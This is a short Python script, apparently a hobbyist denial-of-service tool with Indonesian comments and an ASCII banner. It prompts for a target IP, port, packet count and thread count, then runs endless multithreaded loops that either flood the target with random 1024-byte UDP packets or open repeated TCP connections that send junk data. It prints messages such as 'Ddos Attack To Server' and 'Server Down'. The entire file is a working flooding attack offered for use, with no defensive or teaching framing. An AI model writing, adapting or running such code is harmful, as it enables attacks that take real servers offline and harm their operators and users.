#!/usr/bin/env python3
#Kagak Usah Rename BY by Mamank Sa-mp
#Ddos by Yooooo
import random
import socket
import threading
import os

os.system("clear")
print("__  __     ____                        _ ")
print("|  \/  |___/ ___|  __ _ _   _  __ _  __| |")
print("| |\/| / __\___ \ / _` | | | |/ _` |/ _` |")
print("| |  | \__ \___) | (_| | |_| | (_| | (_| |")
print("|_|  |_|___/____/ \__, |\__,_|\__,_|\__,_|")
print("                     |_|                  ")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Lanjut gak ?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" |Ddos Attack To Server|")
    except:
      print("[!] |Ddos Attack To Server|")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" MANTAPPPPPP")
    except:
      s.close()
      print("[*] Server Down ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()